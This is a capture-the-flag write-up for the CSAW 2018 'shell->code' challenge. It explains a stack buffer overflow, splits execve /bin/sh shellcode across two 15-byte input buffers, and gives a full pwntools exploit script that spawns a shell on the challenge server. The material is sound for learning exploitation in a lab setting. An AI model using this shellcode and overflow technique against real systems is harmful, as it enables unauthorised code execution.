#### CSAW CTF Qualification Round 2018 - shell->code 100  - Pwn

##### Challenge

Linked lists are great! They let you chain pieces of data together.

```bash
nc pwn.chal.csaw.io 9005
```

[File](https://unam.re/static/files/shellpointcode)

#### Summary

Easy pwning challenge where the program receives three inputs from the user.  First two inputs are of 15 bytes each, and third input, which is where we can overwrite the instruction pointer with a buffer overflow.

The trick of this challenge is that we just have 15 bytes (+15 bytes) where we can place our shellcode. Thus, we need to modify our shellcode to jump to the second part.

#### Solution

Binary:

```
$ file shellpointcode 
shellpointcode: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=214cfc4f959e86fe8500f593e60ff2a33b3057ee, not stripped
```

Funtion where the program gets the two first inputs and it prints the address where first input is saved (it will be where our shellcode starts).

![](https://unam.re/static/files/csaw_pwn1_function.png)



![](https://unam.re/static/files/csaw_pwn1_bof.png)

```bash
$ ./shellpointcode 
Linked lists are great! 
They let you chain pieces of data together.

(15 bytes) Text for node 1:  
TEST
(15 bytes) Text for node 2: 
TESTTTTTTTTT
node1: 
node.next: 0x7ffdac473710
node.buffer: TEST

What are your initials?
FOOOOOOOOOOOOOOOOOOBARRR
Thanks FOOOOOOOOOOOOOOOOOOBARRR

Segmentation fault

```



Next step is overwrite RIP and examine where is *node 1* and *node 2*, then, go to peda and exploit it!

![](https://unam.re/static/files/csaw_pwn_peda1.png)

and look where is the offset. 

```
[RSP] --> offset 11 - size ~20
```

Thus, our exploit should be 11 bytes offset + *node 1 address*

To know where is *node 1*, as we know the print that the program returned. So we examine the stack and subtract this address with *node 1*.

```
0x7fffffffdfa8-0x7fffffffdf80 = 40
```

Now we know how to jump to our shellcode placed in *node 1*, the problem is that *node 1* only has 15 bytes and the shellcode which I want to use has 30 bytes.

An easy x64 shellcode of 30 bytes:

```assembly
xor rax, rax
mov rdi, 0x68732f6e69622f2f
xor rsi, rsi
push rsi
push rdi
mov rdi, rsp
xor rdx, rdx
mov al, 59
syscall
```

We know that both variables are saving in memory in consecutive order.

*node 1* + \n + *node 2*

Therefore, we cut the shellcode in two parts, the first part ends with *pop rxc* in order to remove \n and *jmp rsp* in order to jump to *node 2* (also, we hace removed xor eax, eax; because we dont need it)

```assembly
; Node 1
mov rdi, 0x68732f6e69622f2f
pop rcx
jmp rsp
; Node 2
xor rsi, rsi
push rsi
push rdi
mov rdi, rsp
xor rdx, rdx
mov al, 59
syscall
```

Now we can put all together and get the flag!!

Final exploit:

```python
from pwn import *

context(arch = 'amd64', os = 'linux')

#p = process("./shellpointcode")
#p = gdb.debug("/home/manu/CTF/CSAW_2018/pwn/shellpointcode", '''
#        c
#''')

p = remote('pwn.chal.csaw.io',9005)
shell1 = "\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x59\xff\xe4"
shell2 = "\x48\x31\xf6\x56\x57\x48\x89\xe7\x48\x31\xd2\xb0\x3b\x0f\x05"
node_1 = p.recvuntil("(15 bytes) Text for node 1:")
shellcode = "\x48\x31\xc0\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\x31\xf6\x56\x57\x48\x89\xe7\x48\x31\xd2\xb0\x3b\x0f\x05"
p.sendline(shell1)
node_2 = p.recvuntil("(15 bytes) Text for node 2:")
p.sendline(shell2)
data = p.recvuntil("What are your initials?\x0a")
shellcode_addr = data.split("\n")[2].split(":")[1].strip()
addr = p64(int(shellcode_addr, 16)+0x28)
log.info("Shellcode addr = %s"%hex(int(shellcode_addr, 16)+0x28))
p.sendline("A"*11+addr)
p.interactive()
```



Exploit (with flag):

![](https://unam.re/static/files/csaw_pwn1_flag.png)



